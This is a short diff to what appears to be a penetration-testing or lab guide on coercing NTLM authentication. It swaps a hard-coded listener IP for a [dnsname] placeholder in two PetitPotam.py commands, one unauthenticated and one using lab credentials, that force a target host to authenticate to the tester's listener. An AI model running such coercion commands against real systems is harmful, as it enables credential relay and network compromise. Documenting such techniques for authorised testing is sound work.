@@ -222,7 +222,7 @@ Trigger the target machine to authenticate outbound to your injected DNS record.
 **Unauthenticated (unpatched target):**
 ```bash
 python3 PetitPotam.py \
-  192.168.45.200 \         # your listener IP (matches DNS record)
+  [dnsname] \         # your listener IP (matches DNS record)
   192.168.1.50             # target host to coerce
 ```
 
@@ -232,7 +232,7 @@ python3 PetitPotam.py \
   -u pentester \
   -p 'P@ss' \
   -d lab.local \
-  192.168.45.200 \
+   [dnsname] \
   192.168.1.50
 ```
 
